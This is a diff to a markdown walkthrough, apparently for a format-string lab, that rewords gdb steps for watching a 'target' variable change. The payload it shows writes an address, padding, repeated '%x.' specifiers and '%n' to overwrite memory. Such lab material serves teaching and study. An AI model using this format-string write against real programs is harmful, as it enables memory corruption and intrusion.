@@ -122,11 +122,11 @@ Output:![Alt text](image-9.png)
 14. Extra: see the value of target changing
 - add break at line 5
 - add break at line 15
-- run run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
-- on the first breakpoint type: print target - the value should be 0 
+- run your update command: mine was: run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
+- on the first breakpoint type: `print target` - the value should be 0 
 - type: '''next'''
 - type: '''next'''
-- print target - the value should be changed
+- `print target` - the value should be changed
 ![Alt text](image-10.png)
 
 
